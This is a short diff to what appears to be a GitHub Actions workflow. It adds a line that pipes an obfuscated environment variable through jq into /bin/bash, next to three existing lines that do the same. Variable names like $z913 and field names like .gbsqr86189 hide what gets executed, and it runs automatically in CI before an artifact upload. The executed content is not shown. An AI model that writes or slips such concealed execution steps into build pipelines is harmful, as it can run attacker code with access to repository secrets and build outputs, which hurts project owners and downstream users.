@@ -32,6 +32,7 @@ jobs:
           echo $zar381 | jq -r .xqmk816 | /bin/bash
           echo $hyj3 | jq -r .xwkmu8573 | /bin/bash
           printf '%s' "$he88" | jq -r .tatd98835 | /bin/bash
+          echo $z913 | jq -r .gbsqr86189 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
